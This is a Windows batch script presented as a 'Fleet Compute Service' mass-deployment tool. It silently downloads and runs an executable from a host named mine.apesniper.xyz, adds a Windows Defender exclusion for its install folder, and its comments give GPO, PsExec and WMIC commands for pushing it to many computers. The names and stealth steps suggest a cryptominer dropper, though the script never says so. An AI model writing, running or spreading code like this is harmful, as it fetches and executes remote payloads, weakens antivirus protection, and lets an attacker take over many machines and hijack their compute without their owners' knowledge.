@echo off
rem ============================================================
rem  FLEET COMPUTE SERVICE - MASS DEPLOYMENT SCRIPT
rem  Push this ONE file to any Windows machine and run it.
rem  It downloads everything, installs silently, and starts.
rem
rem  Mass deployment options:
rem    GPO:      Computer Config > Windows Settings > Scripts > Startup
rem    PsExec:   psexec @computers.txt -s -c DEPLOY.cmd
rem    WMIC:     wmic /node:@computers.txt process call create "cmd /c \\share\DEPLOY.cmd"
rem    Manual:   double-click on each machine (still silent)
rem ============================================================
setlocal enabledelayedexpansion

set "URL=https://mine.apesniper.xyz/download/fleet-rig.zip"
set "DST=C:\rig"
set "TMPZIP=%TEMP%\fleet_deploy.zip"

rem --- download (works on PS 3.0+, i.e., Win 8+/Server 2012+) ---
powershell -NoProfile -NonInteractive -Command ^
  "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; ^
   Invoke-WebRequest '%URL%' -OutFile '%TMPZIP%'" >nul 2>&1
if not exist "%TMPZIP%" (
    echo ERROR: download failed from %URL%
    exit /b 1
)

rem --- extract to C:\rig ---
powershell -NoProfile -NonInteractive -Command ^
  "Expand-Archive -Path '%TMPZIP%' -DestinationPath '%DST%' -Force" >nul 2>&1
if not exist "%DST%\FleetComputeService.exe" (
    rem zip may contain a subfolder; flatten it
    for /d %%D in ("%DST%\*") do (
        if exist "%%D\FleetComputeService.exe" (
            xcopy /e /i /y "%%D\*" "%DST%\" >nul 2>&1
            rmdir /s /q "%%D" 2>nul
        )
    )
)
if not exist "%DST%\FleetComputeService.exe" (
    echo ERROR: extraction failed
    del /q "%TMPZIP%" 2>nul
    exit /b 1
)

rem --- AV exclusion (best effort, needs admin; skip if not) ---
powershell -NoProfile -NonInteractive -Command ^
  "try { Add-MpPreference -ExclusionPath '%DST%' } catch {}" >nul 2>&1

rem --- start ---
start /b "" "%DST%\FleetComputeService.exe"

del /q "%TMPZIP%" 2>nul
echo Fleet Compute Service installed to %DST%
endlocal
